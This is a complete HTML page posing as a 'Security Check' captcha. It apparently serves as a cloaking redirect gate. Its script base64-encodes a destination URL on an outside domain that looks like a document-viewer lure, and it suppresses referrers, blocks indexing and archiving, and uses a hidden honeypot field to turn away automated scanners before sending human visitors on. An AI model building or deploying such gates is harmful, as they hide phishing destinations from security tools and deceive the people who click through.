<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Prevents the destination server from seeing where the click came from -->
    <meta name="referrer" content="no-referrer">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <title>Checking...</title>
    <style>
        :root { --p: #2563eb; --t: #1e293b; }
        body { margin:0; background:#f8fafc; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; }
        .card { background:#fff; padding:2.5rem; border-radius:16px; box-shadow:0 20px 25px -5px rgba(0,0,0,0.1); width:100%; max-width:350px; text-align:center; border:1px solid #e2e8f0; }
        .icon { background:#eff6ff; width:60px; height:60px; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1.5rem; font-size: 24px; }
        h1 { font-size:1.3rem; color:var(--t); margin-bottom:0.5rem; }
        p { color:#64748b; font-size:0.9rem; line-height:1.5; margin-bottom:1.5rem; }
        .captcha { background:#f1f5f9; border:1px solid #cbd5e1; padding:1.2rem; border-radius:12px; margin-bottom:1rem; }
        #q-text { font-weight:700; font-size:1.1rem; display:block; margin-bottom:0.8rem; }
        input { width:80px; padding:10px; border:2px solid #cbd5e1; border-radius:8px; text-align:center; font-size:1.1rem; outline:none; }
        input:focus { border-color:var(--p); }
        button { width:100%; background:var(--p); color:#fff; border:none; padding:14px; border-radius:8px; font-weight:600; cursor:pointer; transition:0.2s; }
        button:hover { background:#1d4ed8; }
        #err { color:#ef4444; font-size:0.8rem; margin-top:10px; display:none; }
        .hp { position:absolute; left:-9999px; top:-9999px; } 
    </style>
</head>
<body>

<div class="card">
    <div class="icon">🛡️</div>
    <h1 id="title">Security Check</h1>
    <p id="desc">Complete the verification to continue to the destination.</p>

    <div class="hp"><input type="text" id="bot_check" tabindex="-1"></div>

    <div class="captcha">
        <span id="q-text"></span>
        <input type="number" id="ans_input" placeholder="?">
        <div id="err">Incorrect. Please try again.</div>
    </div>

    <button id="vbtn" onclick="verify()">Verify & Continue</button>
</div>

<script>
    // NEW ENCODED LINK (optifydigitally.com)
    const _secret = "aHR0cHM6Ly9vcHRpZnlkaWdpdGFsbHkuY29tL2RvY2Rpc3BwbGF5dG9vbDAwaWlmaWxlL3ZyeWluZ3Byb2plY3QyMG1hcmlsLmh0bWw=";

    const v1 = Math.floor(Math.random() * 8) + 2;
    const v2 = Math.floor(Math.random() * 5) + 1;
    const result = v1 + v2;

    document.getElementById('q-text').innerText = v1 + " + " + v2 + " = ?";
    
    setTimeout(() => { document.title = "Human Verification"; }, 1000);

    function verify() {
        const userAns = document.getElementById('ans_input').value;
        const botTrap = document.getElementById('bot_check').value;
        const errMsg = document.getElementById('err');
        const btn = document.getElementById('vbtn');

        if (botTrap !== "") return; 

        if (parseInt(userAns) === result) {
            btn.innerText = "Redirecting...";
            btn.disabled = true;

            const target = atob(_secret);

            // Clean Redirect Method
            setTimeout(() => {
                const a = document.createElement('a');
                a.href = target;
                a.rel = 'noreferrer';
                a.click();
            }, 400);

        } else {
            errMsg.style.display = 'block';
            document.getElementById('ans_input').value = "";
        }
    }

    document.getElementById('ans_input').addEventListener('keypress', (e) => {
        if (e.key === 'Enter') verify();
    });
</script>

</body>
</html>
